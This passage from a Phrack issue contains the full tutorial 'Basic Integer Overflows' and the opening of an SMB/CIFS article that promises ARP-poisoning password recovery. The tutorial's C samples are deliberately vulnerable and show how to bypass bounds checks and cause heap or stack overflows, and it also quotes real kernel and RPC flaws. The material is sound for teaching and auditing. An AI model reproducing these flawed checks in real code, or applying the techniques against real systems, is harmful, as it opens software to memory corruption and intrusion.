M($Y?*&quot;)787)N(&#039;=H96X@8FQI&lt;&quot;!C:&amp;5C:R!O9B!C86QL&lt;R!C;W5L9&quot;!N;W0@
M8F4@96UI=&amp;5D(BD@?0T*(&#039;T[#0H@#0H@=F]I9`T*0$`@+34R,34L-B`K-3(T
M,&quot;PY($!`#0H@(&quot;`O*B!3=&amp;]P(&#039;1I;6EN9R!A;F0@&lt;&#039;)I;G0@=&amp;AE(&#039;1I;65S
M+B`@*B\-&quot;B`@(&#039;1I;65V87)?&lt;W1O&lt;&quot;`H5%9?5$]404PI.PT*(&quot;`@=&amp;EM979A
M&lt;E]P&lt;FEN=&quot;`H&lt;W1D97)R*3L-&quot;BL-&quot;BL@(&quot;\J(%!R:6YT(&amp;)L:7`@&lt;W1A=&amp;ES
M=&amp;EC&lt;R`J+PT**R`@8FQI&lt;%]S=&amp;%T7W!R:6YT*&#039;-T9&amp;5R&lt;BD[#0H@?0T*(`P-
M&quot;B`O*B!%;G1R&gt;2!P;VEN=&quot;!O9B!C8S$L(&amp;-C,7!L=7,L(&amp;IC,2P@9C&lt;W,2P@
&amp;971C+@T*
`
end

|=[ EOF ]=---------------------------------------------------------------=|



--------------------------------------------------------------------------------


                             ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x0a of 0x10


|=--------------------=[ Basic Integer Overflows ]=----------------------=|
|=-----------------------------------------------------------------------=|
|=-------------------=[ by blexim &lt;blexim@hush.com&gt; ]=-------------------=|

1: Introduction
    1.1 What is an integer?
    1.2 What is an integer overflow?
    1.3 Why can they be dangerous?

2: Integer overflows
    2.1 Widthness overflows
        2.1.1 Exploiting
    2.2 Arithmetic overflows
        2.2.1 Exploiting

3: Signedness bugs
    3.1 What do they look like?
        3.1.1 Exploiting
    3.2 Signedness bugs caused by integer overflows

4: Real world examples
    4.1 Integer overflows
    4.2 Signedness bugs


--[ 1.0 Introduction

In this paper I&#039;m going to describe two classes of programming bugs which
can sometimes allow a malicious user to modify the execution path of an
affected process.  Both of these classes of bug work by causing variables
to contain unexpected values, and so are not as &quot;direct&quot; as classes which
overwrite memory, e.g. buffer overflows or format strings.  All the
examples given in the paper are in C, so a basic familiarity with C is
assumed.  A knowledge of how integers are stored in memory is also useful,
but not essential.


----[ 1.1 What is an integer?

An integer, in the context of computing, is a variable capable of
representing a real number with no fractional part.  Integers are typically
the same size as a pointer on the system they are compiled on (i.e. on a 32
bit system, such as i386, an integer is 32 bits long, on a 64 bit system,
such as SPARC, an integer is 64 bits long).  Some compilers don&#039;t use
integers and pointers of the same size however, so for the sake of
simplicity all the examples refer to a 32 bit system with 32 bit integers,
longs and pointers.

Integers, like all variables are just regions of memory.  When we talk
about integers, we usually represent them in decimal, as that is the
numbering system humans are most used to.  Computers, being digital, cannot
deal with decimal, so internally to the computer integers are stored in
binary.  Binary is another system of representing numbers which uses only
two numerals, 1 and 0, as opposed to the ten numerals used in decimal.  As
well as binary and decimal, hexadecimal (base sixteen) is often used in
computing as it is very easy to convert between binary and hexadecimal.

Since it is often necessary to store negative numbers, there needs to be a
mechanism to represent negative numbers using only binary.  The way this is
accomplished is by using the most significant bit (MSB) of a variable to
determine the sign: if the MSB is set to 1, the variable is interpreted as
negative; if it is set to 0, the variable is positive.  This can cause some
confusion, as will be explained in the section on signedness bugs, because
not all variables are signed, meaning they do not all use the MSB to
determine whether they are positive or negative.  These variable are known
as unsigned and can only be assigned positive values, whereas variables
which can be either positive or negative are called unsigned.


----[ 1.2 What is an integer overflow?

Since an integer is a fixed size (32 bits for the purposes of this paper),
there is a fixed maximum value it can store.  When an attempt is made to
store a value greater than this maximum value it is known as an integer
overflow.  The ISO C99 standard says that an integer overflow causes
&quot;undefined behaviour&quot;, meaning that compilers conforming to the standard
may do anything they like from completely ignoring the overflow to aborting
the program.  Most compilers seem to ignore the overflow, resulting in an
unexpected or erroneous result being stored.


----[ 1.3 Why can they be dangerous?

Integer overflows cannot be detected after they have happened, so there is
not way for an application to tell if a result it has calculated previously
is in fact correct.  This can get dangerous if the calculation has to do
with the size of a buffer or how far into an array to index.  Of course
most integer overflows are not exploitable because memory is not being
directly overwritten, but sometimes they can lead to other classes of bugs,
frequently buffer overflows.  As well as this, integer overflows can be
difficult to spot, so even well audited code can spring surprises.



--[ 2.0 Integer overflows

So what happens when an integer overflow does happen?  ISO C99 has this to
say:

    &quot;A computation involving unsigned operands can never overflow,
    because a result that cannot be represented by the resulting unsigned
    integer type is reduced modulo the number that is one greater than
    the largest value that can be represented by the resulting type.&quot;

NB: modulo arithmetic involves dividing two numbers and taking the
remainder,
e.g.
    10 modulo 5 = 0
    11 modulo 5 = 1
so reducing a large value modulo (MAXINT + 1) can be seen as discarding the
portion of the value which cannot fit into an integer and keeping the rest.
In C, the modulo operator is a % sign.
&lt;/NB&gt;

This is a bit wordy, so maybe an example will better demonstrate the
typical &quot;undefined behaviour&quot;:

We have two unsigned integers, a and b, both of which are 32 bits long.  We
assign to a the maximum value a 32 bit integer can hold, and to b we assign
1.  We add a and b together and store the result in a third unsigned 32 bit
integer called r:

    a = 0xffffffff
    b = 0x1
    r = a + b

Now, since the result of the addition cannot be represented using 32 bits,
the result, in accordance with the ISO standard, is reduced modulo
0x100000000.

    r = (0xffffffff + 0x1) % 0x100000000
    r = (0x100000000) % 0x100000000 = 0

Reducing the result using modulo arithmetic basically ensures that only the
lowest 32 bits of the result are used, so integer overflows cause the
result to be truncated to a size that can be represented by the variable.
This is often called a &quot;wrap around&quot;, as the result appears to wrap around
to 0.


----[ 2.1 Widthness overflows

So an integer overflow is the result of attempting to store a value in a
variable which is too small to hold it.  The simplest example of this can
be demonstrated by simply assigning the contents of large variable to a
smaller one:

    /* ex1.c - loss of precision */
    #include &lt;stdio.h&gt;

    int main(void){
            int l;
            short s;
            char c;

            l = 0xdeadbeef;
            s = l;
            c = l;

            printf(&quot;l = 0x%x (%d bits)\n&quot;, l, sizeof(l) * 8);
            printf(&quot;s = 0x%x (%d bits)\n&quot;, s, sizeof(s) * 8);
            printf(&quot;c = 0x%x (%d bits)\n&quot;, c, sizeof(c) * 8);

            return 0;
    }
    /* EOF */

The output of which looks like this:

    nova:signed {48} ./ex1
    l = 0xdeadbeef (32 bits)
    s = 0xffffbeef (16 bits)
    c = 0xffffffef (8 bits)

Since each assignment causes the bounds of the values that can be stored in
each type to be exceeded, the value is truncated so that it can fit in the
variable it is assigned to.

It is worth mentioning integer promotion here.  When a calculation
involving operands of different sizes is performed, the smaller operand is
&quot;promoted&quot; to the size of the larger one.  The calculation is then
performed with these promoted sizes and, if the result is to be stored in
the smaller variable, the result is truncated to the smaller size again.
For example:

    int i;
    short s;

    s = i;

A calculation is being performed with different sized operands here.  What
happens is that the variable s is promoted to an int (32 bits long), then
the contents of i is copied into the new promoted s.  After this, the
contents of the promoted variable are &quot;demoted&quot; back to 16 bits in order to
be saved in s.  This demotion can cause the result to be truncated if it is
greater than the maximum value s can hold.

------[ 2.1.1 Exploiting

Integer overflows are not like most common bug classes.  They do not allow
direct overwriting of memory or direct execution flow control, but are much
more subtle.  The root of the problem lies in the fact that there is no way
for a process to check the result of a computation after it has happened,
so there may be a discrepancy between the stored result and the correct
result.  Because of this, most integer overflows are not actually
exploitable.  Even so, in certain cases it is possible to force a crucial
variable to contain an erroneous value, and this can lead to problems later
in the code.

Because of the subtlety of these bugs, there is a huge number of situations
in which they can be exploited, so I will not attempt to cover all
exploitable conditions.  Instead, I will provide examples of some
situations which are exploitable, in the hope of inspiring the reader in
their own research :)

Example 1:

    /* width1.c - exploiting a trivial widthness bug */
    #include &lt;stdio.h&gt;
    #include &lt;string.h&gt;

    int main(int argc, char *argv[]){
            unsigned short s;
            int i;
            char buf[80];

            if(argc &lt; 3){
                    return -1;
            }

            i = atoi(argv[1]);
            s = i;

            if(s &gt;= 80){            /* [w1] */
                    printf(&quot;Oh no you don&#039;t!\n&quot;);
                    return -1;
            }

            printf(&quot;s = %d\n&quot;, s);

            memcpy(buf, argv[2], i);
            buf[i] = &#039;\0&#039;;
            printf(&quot;%s\n&quot;, buf);

            return 0;
    }


While a construct like this would probably never show up in real life code,
it serves well as an example.  Take a look at the following inputs:

    nova:signed {100} ./width1 5 hello
    s = 5
    hello
    nova:signed {101} ./width1 80 hello
    Oh no you don&#039;t!
    nova:signed {102} ./width1 65536 hello
    s = 0
    Segmentation fault (core dumped)

The length argument is taken from the command line and held in the integer
i.  When this value is transferred into the short integer s, it is
truncated if the value is too great to fit into s (i.e. if the value is
greater than 65535).  Because of this, it is possible to bypass the bounds
check at [w1] and overflow the buffer.  After this, standard stack smashing
techniques can be used to exploit the process.


----[ 2.2 Arithmetic overflows

As shown in section 2.0, if an attempt is made to store a value in an
integer which is greater than the maximum value the integer can hold, the
value will be truncated.  If the stored value is the result of an
arithmetic operation, any part of the program which later uses the result
will run incorrectly as the result of the arithmetic being incorrect.
Consider this example demonstrating the wrap around shown earlier:

    /* ex2.c - an integer overflow */
    #include &lt;stdio.h&gt;

    int main(void){
            unsigned int num = 0xffffffff;

            printf(&quot;num is %d bits long\n&quot;, sizeof(num) * 8);
            printf(&quot;num = 0x%x\n&quot;, num);
            printf(&quot;num + 1 = 0x%x\n&quot;, num + 1);

            return 0;
    }
    /* EOF */

The output of this program looks like this:

    nova:signed {4} ./ex2
    num is 32 bits long
    num = 0xffffffff
    num + 1 = 0x0

Note:
The astute reader will have noticed that 0xffffffff is decimal -1, so it
appears that we&#039;re just doing
1 + (-1) = 0
Whilst this is one way at looking at what&#039;s going on, it may cause some
confusion since the variable num is unsigned and therefore all arithmetic
done on it will be unsigned.  As it happens, a lot of signed arithmetic
depends on integer overflows, as the following demonstrates (assume both
operands are 32 bit variables):

-700       + 800   = 100
0xfffffd44 + 0x320 = 0x100000064

Since the result of the addition exceeds the range of the variable, the
lowest 32 bits are used as the result.  These low 32 bits are 0x64, which
is equal to decimal 100.
&lt;/note&gt;

Since an integer is signed by default, an integer overflow can cause a
change in signedness which can often have interesting effects on subsequent
code.  Consider the following example:

    /* ex3.c - change of signedness */
    #include &lt;stdio.h&gt;

    int main(void){
            int l;

            l = 0x7fffffff;

            printf(&quot;l = %d (0x%x)\n&quot;, l, l);
            printf(&quot;l + 1 = %d (0x%x)\n&quot;, l + 1 , l + 1);

            return 0;
    }
    /* EOF */

The output of which is:

    nova:signed {38} ./ex3
    l = 2147483647 (0x7fffffff)
    l + 1 = -2147483648 (0x80000000)

Here the integer is initialised with the highest positive value a signed
long integer can hold.  When it is incremented, the most significant bit
(indicating signedness) is set and the integer is interpreted as being
negative.

Addition is not the only arithmetic operation which can cause an integer to
overflow.  Almost any operation which changes the value of a variable can
cause an overflow, as demonstrated in the following example:

    /* ex4.c - various arithmetic overflows */
    #include &lt;stdio.h&gt;

    int main(void){
            int l, x;

            l = 0x40000000;

            printf(&quot;l = %d (0x%x)\n&quot;, l, l);

            x = l + 0xc0000000;
            printf(&quot;l + 0xc0000000 = %d (0x%x)\n&quot;, x, x);

            x = l * 0x4;
            printf(&quot;l * 0x4 = %d (0x%x)\n&quot;, x, x);

            x = l - 0xffffffff;
            printf(&quot;l - 0xffffffff = %d (0x%x)\n&quot;, x, x);

            return 0;
    }
    /* EOF */

Output:

    nova:signed {55} ./ex4
    l = 1073741824 (0x40000000)
    l + 0xc0000000 = 0 (0x0)
    l * 0x4 = 0 (0x0)
    l - 0xffffffff = 1073741825 (0x40000001)

The addition is causing an overflow in exactly the same way as the first
example, and so is the multiplication, although it may seem different.  In
both cases the result of the arithmetic is too great to fit in an integer,
so it is reduced as described above.  The subtraction is slightly
different, as it is causing an underflow rather than an overflow: an
attempt is made to store a value lower than the minimum value the integer
can hold, causing a wrap around.  In this way we are able to force an
addition to subtract, a multiplication to divide or a subtraction to add.

------[ 2.2.1 Exploiting

One of the most common ways arithmetic overflows can be exploited is when a
calculation is made about how large a buffer must be allocated.  Often a
program must allocate space for an array of objects, so it uses the
malloc(3) or calloc(3) routines to reserve the space and calculates how
much space is needed by multiplying the number of elements by the size of
an object.  As has been previously shown, if we are able to control either
of these operands (number of elements or object size) we may be able to
mis-size the buffer, as the following code fragment shows:

    int myfunction(int *array, int len){
        int *myarray, i;

        myarray = malloc(len * sizeof(int));    /* [1] */
        if(myarray == NULL){
            return -1;
        }

        for(i = 0; i &lt; len; i++){              /* [2] */
            myarray[i] = array[i];
        }

        return myarray;
    }

This seemingly innocent function could bring about the downfall of a system
due to its lack of checking of the len parameter.  The multiplication at
[1] can be made to overflow by supplying a high enough value for len, so we
can force the buffer to be any length we choose.  By choosing a suitable
value for len, we can cause the loop at [2] to write past the end of the
myarray buffer, resulting in a heap overflow.  This could be leveraged into
executing arbitrary code on certain implementations by overwriting malloc
control structures, but that is beyond the scope of this article.

Another example:

    int catvars(char *buf1, char *buf2, unsigned int len1,
                unsigned int len2){
        char mybuf[256];

        if((len1 + len2) &gt; 256){    /* [3] */
            return -1;
        }

        memcpy(mybuf, buf1, len1);      /* [4] */
        memcpy(mybuf + len1, buf2, len2);

        do_some_stuff(mybuf);

        return 0;
    }

In this example, the check at [3] can be bypassed by using suitable values
for len1 and len2 that will cause the addition to overflow and wrap around
to a low number.  For example, the following values:

    len1 = 0x104
    len2 = 0xfffffffc

when added together would result in a wrap around with a result of 0x100
(decimal 256).  This would pass the check at [3], then the memcpy(3)&#039;s at
[4] would copy data well past the end of the buffer.



--[ 3 Signedness Bugs

Signedness bugs occur when an unsigned variable is interpreted as signed,
or when a signed variable is interpreted as unsigned.  This type of
behaviour can happen because internally to the computer, there is no
distinction between the way signed and unsigned variables are stored.
Recently, several signedness bugs showed up in the FreeBSD and OpenBSD
kernels, so there are many examples readily available.


----[ 3.1 What do they look like?

Signedness bugs can take a variety of forms, but some of the things to look
out for are:
* signed integers being used in comparisons
* signed integers being used in arithmetic
* unsigned integers being compared to signed integers

Here is classic example of a signedness bug:

    int copy_something(char *buf, int len){
        char kbuf[800];

        if(len &gt; sizeof(kbuf)){         /* [1] */
            return -1;
        }

        return memcpy(kbuf, buf, len);  /* [2] */
    }

The problem here is that memcpy takes an unsigned int as the len parameter,
but the bounds check performed before the memcpy is done using signed
integers.  By passing a negative value for len, it is possible to pass the
check at [1], but then in the call to memcpy at [2], len will be interpeted
as a huge unsigned value, causing memory to be overwritten well past the
end of the buffer kbuf.

Another problem that can stem from signed/unsigned confusion occurs when
arithmetic is performed.  Consider the following example:

    int table[800];

    int insert_in_table(int val, int pos){
        if(pos &gt; sizeof(table) / sizeof(int)){
            return -1;
        }

        table[pos] = val;

        return 0;
    }

Since the line
    table[pos] = val;
is equivalent to
    *(table + (pos * sizeof(int))) = val;
we can see that the problem here is that the code does not expect a
negative operand for the addition: it expects (table + pos) to be greater
than table, so providing a negative value for pos causes a situation which
the program does not expect and can therefore not deal with.

------[ 3.1.1 Exploiting

This class of bug can be problematic to exploit, due to the fact that
signed integers, when interpreted as unsigned, tend to be huge.  For
example, -1 when represented in hexadecimal is 0xffffffff.  When
interpreted as unsiged, this becomes the greatest value it is possible to
represent in an integer (4,294,967,295), so if this value is passed to
mempcpy as the len parameter (for example), memcpy will attempt to copy 4GB
of data to the destination buffer.  Obviously this is likely to cause a
segfault or, if not, to trash a large amount of the stack or heap.
Sometimes it is possible to get around this problem by passing a very low
value for the source address and hope, but this is not always possible.



----[ 3.2 Signedness bugs caused by integer overflows

Sometimes, it is possible to overflow an integer so that it wraps around to
a negative number.  Since the application is unlikely to expect such a
value, it may be possible to trigger a signedness bug as described above.

An example of this type of bug could look like this:

    int get_two_vars(int sock, char *out, int len){
        char buf1[512], buf2[512];
        unsigned int size1, size2;
        int size;

        if(recv(sock, buf1, sizeof(buf1), 0) &lt; 0){
            return -1;
        }
        if(recv(sock, buf2, sizeof(buf2), 0) &lt; 0){
            return -1;
        }

        /* packet begins with length information */
        memcpy(&amp;size1, buf1, sizeof(int));
        memcpy(&amp;size2, buf2, sizeof(int));

        size = size1 + size2;       /* [1] */

        if(size &gt; len){             /* [2] */
            return -1;
        }

        memcpy(out, buf1, size1);
        memcpy(out + size1, buf2, size2);

        return size;
    }

This example shows what can sometimes happen in network daemons, especially
when length information is passed as part of the packet (in other words, it
is supplied by an untrusted user).  The addition at [1], used to check that
the data does not exceed the bounds of the output buffer, can be abused by
setting size1 and size2 to values that will cause the size variable to wrap
around to a negative value.  Example values could be:
    size1 = 0x7fffffff
    size2 = 0x7fffffff
    (0x7fffffff + 0x7fffffff = 0xfffffffe (-2)).
When this happens, the bounds check at [2] passes, and a lot more of the
out buffer can be written to than was intended (in fact, arbitrary memory
can be written to, as the (out + size1) dest parameter in the second memcpy
call allows us to get to any location in memory).

These bugs can be exploited in exactly the same way as regular signedness
bugs and have the same problems associated with them - i.e. negative values
translate to huge positive values, which can easily cause segfaults.



--[ 4 Real world examples

There are many real world applications containing integer overflows and
signedness bugs, particularly network daemons and, frequently, in operating
system kernels.

----[ 4.1 Integer overflows

This (non-exploitable) example was taken from a security module for linux.
This code runs in the kernel context:

    int rsbac_acl_sys_group(enum  rsbac_acl_group_syscall_type_t call,
                            union rsbac_acl_group_syscall_arg_t arg)
      {
    ...
        switch(call)
          {
            case ACLGS_get_group_members:
              if(   (arg.get_group_members.maxnum &lt;= 0) /* [A] */
                 || !arg.get_group_members.group
                )
                {
    ...
                rsbac_uid_t * user_array;
                rsbac_time_t * ttl_array;

                user_array = vmalloc(sizeof(*user_array) *
                arg.get_group_members.maxnum);   /* [B] */
                if(!user_array)
                  return -RSBAC_ENOMEM;
                ttl_array = vmalloc(sizeof(*ttl_array) *
                arg.get_group_members.maxnum); /* [C] */
                if(!ttl_array)
                  {
                    vfree(user_array);
                    return -RSBAC_ENOMEM;
                  }

                err =
                rsbac_acl_get_group_members(arg.get_group_members.group,
                                                  user_array,
                                                  ttl_array,

                                                  arg.get_group_members.max
                                                  num);
    ...
    }

In this example, the bounds checking at [A] is not sufficient to prevent
the integer overflows at [B] and [C].  By passing a high enough (i.e.
greater than 0xffffffff / 4) value for   arg.get_group_members.maxnum, we
can cause the multiplications at [B] and [C] to overflow and force the
buffers ttl_array and user_array to be smaller than the application
expects.  Since rsbac_acl_get_group_members copies user controlled data
to these buffers, it is possible to write past the end of the user_array
and ttl_array buffers. In this case, the application used vmalloc() to
allocate the buffers, so an attempt to write past the end of the buffers
will simply raise an error, so it cannot be exploited.  Even so, it
provides an example of what these bugs can look like in real code.

Another example of a recent real world integer overflow vulnerability
was the problem in the XDR RPC library (discovered by ISS X-Force). In this
case, user supplied data was used in the calculation of the size of a
dynamically allocated buffer which was filled with user supplied data.  The
vulnerable code was this:

    bool_t
    xdr_array (xdrs, addrp, sizep, maxsize, elsize, elproc)
         XDR *xdrs;
         caddr_t *addrp;	/* array pointer */
         u_int *sizep;		/* number of elements */
         u_int maxsize;		/* max numberof elements */
         u_int elsize;		/* size in bytes of each element */
         xdrproc_t elproc;	/* xdr routine to handle each element */
    {
      u_int i;
      caddr_t target = *addrp;
      u_int c;		/* the actual element count */
      bool_t stat = TRUE;
      u_int nodesize;

      ...

      c = *sizep;
      if ((c &gt; maxsize) &amp;&amp; (xdrs-&gt;x_op != XDR_FREE))
        {
          return FALSE;
        }
      nodesize = c * elsize;    /* [1] */

      ...

      *addrp = target = mem_alloc (nodesize);   /* [2] */

      ...

      for (i = 0; (i &lt; c) &amp;&amp; stat; i++)
        {
          stat = (*elproc) (xdrs, target, LASTUNSIGNED);   /* [3] */
          target += elsize;
        }

As you can see, by supplying large values for elsize and c (sizep), it
was possible to cause the multiplication at [1] to overflow and cause
nodesize to be much smaller than the application expected.  Since
nodesize was then used to allocate a buffer at [2], the buffer could be
mis-sized leading to a heap overflow at [3].  For more information on this
hole, see the CERT advisory listed in the appendix.


----[ 4.2 Signedness bugs

Recently, several signedness bugs were brought to light in the freebsd
kernel.  These allowed large portions of kernel memory to be read by
passing
negative length paramters to various syscalls.  The getpeername(2) function
had such a problem and looked like this:

    static int
    getpeername1(p, uap, compat)
        struct proc *p;
        register struct getpeername_args /* {
            int	fdes;
            caddr_t asa;
            int	*alen;
    } */ *uap;
    int compat;
    {
        struct file *fp;
        register struct socket *so;
        struct sockaddr *sa;
        int len, error;

        ...

        error = copyin((caddr_t)uap-&gt;alen, (caddr_t)&amp;len, sizeof (len));
        if (error) {
            fdrop(fp, p);
            return (error);
        }

        ...

        len = MIN(len, sa-&gt;sa_len);    /* [1] */
        error = copyout(sa, (caddr_t)uap-&gt;asa, (u_int)len);
        if (error)
            goto bad;
    gotnothing:
        error = copyout((caddr_t)&amp;len, (caddr_t)uap-&gt;alen, sizeof (len));
    bad:
        if (sa)
            FREE(sa, M_SONAME);
        fdrop(fp, p);
        return (error);
    }

This is a classic example of a signedness bug - the check at [1] did not
take into account the fact that len could be negative, in which case the
MIN macro would always return len.  When this negative len parameter was
passed to copyout, it was interpretted as a huge positive integer which
caused copyout to copy up to 4GB of kernel memory to user space.


--[ Conclusion

Integer overflows can be extremely dangerous, partly because it is
impossible to detect them after they have happened.  If an integer overflow
takes place, the application cannot know that the calculation it has
performed is incorrect, and it will continue under the assumption that it
is.  Even though they can be difficult to exploit, and frequently cannot be
exploited at all, they can cause unepected behaviour, which is never a good
thing in a secure system.


--[ Appendix

CERT advisory on the XDR bug:
http://www.cert.org/advisories/CA-2002-25.html
FreeBSD advisory: http://online.securityfocus.com/advisories/4407


|=[ EOF ]=---------------------------------------------------------------=|



--------------------------------------------------------------------------------


               Volume 0x0b, Issue 0x3c, Phile #0x0b of 0x10

|=---------------------=[ SMB/CIFS BY THE ROOT ]=------------------------=|
|=-----------------------------------------------------------------------=|
|=---------------=[ ledin &lt;ledin@encephalon-zero.com&gt; ]=-----------------=|



--[ Contents

 1 - Introduction
 
 2 - What is SMB/CIFS
 
 3 - Session establishment
     How does a client establish a SMB session with a server ? 
 
 4 - Security level of SMB
 
 5 - Passwords
 
 6 - Description of several SMB packets
 
   6.1 - The general aspect of a SMB packet
   6.2 - NETBIOS and SMB
   6.3 - The SMB base header
   6.4 - Description of the most importants SMB commands
   6.5 - How I can recover SMB passwords in clear from the network when 
        they should be encrypted ?
   6.6 - Man in the middle attack
   6.7 - Notes about windows 2k/XP SMB operating over TCP 
	
 7 - Transaction subprotocol and RAP commands 
   
   7.1 - RAP commands
 
 8 - Using RAP commands to list shares available on  a server
   
   8.1 - TconX packets
   8.2 - Explanation of the RAP command &quot;NetshareEnum&quot;
 
 9 - Conclusion
 
 10 - References
 
 11 - Thanks 

 Appendix A

 Appendix B
 
 
 
--[ 1 - Introduction


   In this article, I will try to explain what CIFS and SMB are , how
it works and some common insecurities present on these protocols.
This article constitue  a useful source of knowledge about Microsoft 
networking. The SMB protocol is one of the most used protocols on LAN.
I have also included source code in the aim of giving a good expamle 
of SMB operating.

   You will learn how to use ARP poisoning to have password in clear 
from the network when all SMB passwords are encrypted (without brute 
forcing). You will be able to understand the link between SMB and 
NETBIOS. You will also learn what is and how works the Microsoft 
Remote Administration Protocol (RAP) for scanning remote shares on a
SMB server.

   Programs and information are given for educational purpose only. 
I could be not responsable of what you will make with.

--[ 2 - What is SMB/CIFS ?


According to Microsoft CIFS is intended to provide an open cross-
platform mechanism for client systems to request file and print 
services from server systems over a network. It is based on the
standard Server Message Block (SMB) protocol widely in use by 
personal computers and workstations running a wide variety of 
operating systems.

In fact, SMB (for Server Message Block) is a protocol which operates
the data transfert between sharing files, devices, named pipes 
or mail slot across a network. CIFS is a public version of SMB.

SMB clients available :

 from Microsoft : Windows 95, Windows for workgroups 3.x, 
 Windows NT,2000 and XP

 for Linux :
 Smblient from Samba
 Smbfs for Linux

SMB servers :
 Samba
 Microsoft Windows for Workgroups 3.x
 Microsoft Windows 95
 Microsoft Windows NT 
 The PATHWORKS family of servers from Digital
 LAN Manager for OS/2,SCO,etc
 VisionFS from SCO
 TotalNET Advanced Server from Syntax
 Advanced Serverfor UNIX from AT&amp;T (NCR?)
 LAN Server for OS/2 from IBM.

--[ 3 - Session establishment


   Note : SMB protocol was developed to run on DOS ( powered by an 
Intel chip) so byte ordering is little-endian the opposite of network
 ordering.

   SMB can run over TCP/IP, NetBEUI, DECnet Protocol and IPX/SPX. 
With a SMB implementation over TCP/IP, DECnet or NETBEUI, the 
NETBIOS names must be use.

   I will explain in the sixth chapter what NETBIOS is. But for the 
moment, you just have to know that a NETBIOS name identifies one computer
on a Microsoft network.

   The development of SMB has begun in the eighties, so there is a lot
of versions of the SMB protocol. But the most used (on Windows 95, 
98, Windows NT, Windows 2000 and XP) is the NT LM 0.12 
version. This article is based on the NT LM 0.12 version.

   You have to know that a SMB Domain name identifies a group of 
ressource (users, printers, files ..) on a SMB server.

How does a client establish a SMB session with a server ?


   Let&#039;s take this situation : a client  wants to access to a specific
ressource on a server.

1 - To begin the client requests the server for a NETBIOS session. 
The client sends his encoded NETBIOS name to the SMB server 
(which listening connection requests on port 139). 
The server receives the NETBIOS name and replies with a NETBIOS 
session packet to valid the session. The client enters after in a 
SMB session establishment i.e the identification of the client 
to the SMB server.

2 - The client sends a SMB negprot request packet (negprot for 
&quot;negotiate protocol&quot;). The client gives a list of SMB protocol 
versions supported.
Then the server sends a SMB negprot reply packet (with informations 
like SMB domain name, maximun connections accepted, 
SMB protocol versions supported ...)

3 - After the negotiation of protocols, the client processes to a user
or share identification on the server.(see the next chapter to know 
 what is the difference between a share and a user identification)

This process is operated by the SesssetupX request packet (SesssetupX 
for Session Setup and X).
The client sends a couple login/password or a simple password to the 
server that refuses or allows the conection with a SessetupX reply 
packet.

4 - Ok, when the client has finished with negotiation and identification
it sends a tconX packet for specifying the network name of the ressource
that it wants to access, and the server sends a Tconx reply indicating 
if the connection is accepted or not.




                                 netbios session request 
                                      (netbios name)
              [client]       ---------------------------&gt;   [server]
1)
                                 netbios session granted
	      [client]       &lt;--------------------------    [server]
	      
	  

                                  SMB negprot request
              [client]       ---------------------------&gt;   [server]
2)
                                  SMB negprot reply
              [client]       &lt;--------------------------    [server]
	      
	      

                                SMB sesssetupX request
              [client]       ---------------------------&gt;   [server]
3)
                                 SMB sesssetupX reply
              [client]       &lt;--------------------------    [server]
	      

                                 SMB TconX request
              [client]       ---------------------------&gt;   [server]
4)
                                 SMB TconX reply
              [client]       &lt;--------------------------    [server]
	      
	      
A complete description of each packets is given in the chapter six.


--[ 4 - Security level of SMB 
 

There is two types of security models on SMB :

   The first is  the &quot;Share level&quot; security model. This security model
associates a password to a shared ressource on the network. The user 
logs to this ressource (IPC, Disk, Printers) with the correct password.
The user is anyone on the network who knows the name of the server where 
the ressource is.

   The second is the &quot;User Level&quot;. This security model is an enhanced
implementation of the first. It consists to associate a couple of 
login/password to a shared ressource. So if a person wants to 
connect to this shared ressource, he has to know the login/password 
couple. This security level is useful to know who makes what.


--[ 5 - Passwords


   With SMB, when you have to make an identification on a server, your
password could be sent in clear or encrypted. If the server supports
encryption, the client will have to answer a challenge. The server
knows the password, so in the negprot reply packet, an encryption key
will be send to the client. The client encrypts the password,
and sends it in the SesssetupX request packet, the server verifies the
validity of the password and allows the session or not.

You have to know that a SMB password (not encrypted) is 14 bytes 
long maximum. The size of the encryption key is usually 8 bytes long.
The size of the encrypted password is 24 bytes. With ANSI password, the
characters of the password are converted in upper case for the 
encryption.

The password is encrypted with a DES encryption in block mode.


--[6 - Description of several SMB packets


   In this part I will give the description of the most important 
packets types involved in SMB protocol. I know it&#039;s a bit boring 
but this is the base to understand how works SMB and the attacks.
I will explain what is very important in each type of packet.
For each type of command correspond two types of packets. The request 
packet and the reply packet.

----[ 6.1 - The general aspect of a SMB packet.


   In the majority of case SMB runs over TCP/IP protocol suite. 
So let&#039;s consider that SMB runs over TCP layer for us. Over the TCP 
layer, you will always find the NETBIOS (NBT) header. Over NBT you 
have the SMB base header. Over the SMB base header, you have an 
another type of header, which depends of the specific command you 
request.

                    ----------------------
                    |      TCP header    |
                    ----------------------
                    |   NETBIOS header   |
                    ----------------------
                    |   SMB base header  |
                    ----------------------
                    | SMB Command header |
                    ----------------------
                    |        DATA        |
                    ----------------------
			      
The &quot;SMB Base header&quot; contains several informations, like the size of 
reception buffers, maximum connexions allowed... It also contains a 
number that identifies the command requested. 

&quot;SMB command header&quot; is a header with all the parameters for the 
requested command (a command like negotiate protocol versions ... )

&quot;DATA&quot; is the data for the requested command.

I call &quot;SMB packet&quot;, the NETBIOS Header + the SMB base header +
the SMB Command header + DATA.

NOTE :  I will use this definitions :

typedef unsigned char UCHAR;          // 8 unsigned bits
typedef unsigned short USHORT;        // 16 unsigned bits
typedef unsigned long ULONG;          // 32 unsigned bits

and STRING defined a null terminated ASCII string. 


----[ 6.2 - NETBIOS and SMB


NETBIOS (for NETwork Basic Input and Outpout System) is widely use 
on Microsoft networks. It is a sofware interface and a naming system.
Each computer has a NETBIOS name, which is 15 characters long, and a 
sixteenth character is used to identify the type of computer 
( Domain Name server, workstation...).

Value for the sixteenth character :

0x00 base computer, workstation.
0x20 resource sharing server.

There are other values but these are the most interessant for us. The 
first (0x00) identify a workstation and the second (0x20) the server. 

On a SMB packet, the NETBIOS header corresponds to the NETBIOS 
Session header, defined like this :
 
                UCHAR Type;   	// Type of the packet
                UCHAR Flags;  	// Flags
                USHORT Length;	// Count of data bytes (netbios header
                                                        not included)
	      
For the &quot;Flags&quot; field, the value is always 0. (with SMB, not in general !)

For the &quot;Type&quot; field, several values are possible :

               0x81 corresponds to a NETBIOS session request. This code
is used when the client sends its NETBIOS name to the server.

               0x82 is a positive response to a NETBIOS session request.
This code is used by the server to authorize a NETBIOS session. 

               0x00 correspond to a session message. This code is always 
used in a SMB session i.e when the client has sent his NETBIOS name to 
the server and has received a positive reply.	       
	       
The &quot;Length&quot; field contains a count of data bytes (The netbios header 
